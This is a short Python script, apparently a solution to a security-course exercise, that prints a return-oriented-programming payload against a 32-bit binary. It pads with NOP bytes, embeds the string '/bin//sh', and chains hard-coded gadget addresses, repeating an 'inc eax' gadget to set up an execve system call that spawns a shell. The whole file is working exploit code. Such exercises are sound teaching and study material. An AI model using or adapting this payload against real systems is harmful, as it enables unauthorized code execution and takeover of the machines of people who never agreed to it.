#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
shell_path_string = b'/bin//sh'
inc_eax = pack('<I', 0x0805e5fc) + b'\x90'*4
inc_eax_eleven = inc_eax*10 + pack('<I', 0x0805e5fc) + b'\x90'*4

sys.stdout.buffer.write(b'\x90'*104 + shell_path_string
        + pack('<I', 0x0805c393) + b'\x90'*12
        + pack('<I', 0x0805cd90) + b'\x90'*16
        + inc_eax_eleven + pack('<I', 0x0805cd92)
        + pack('<I', 0xfffefe70) + b'\x90'*12
        + pack('<I', 0x0806e241)
        + shell_path_string)
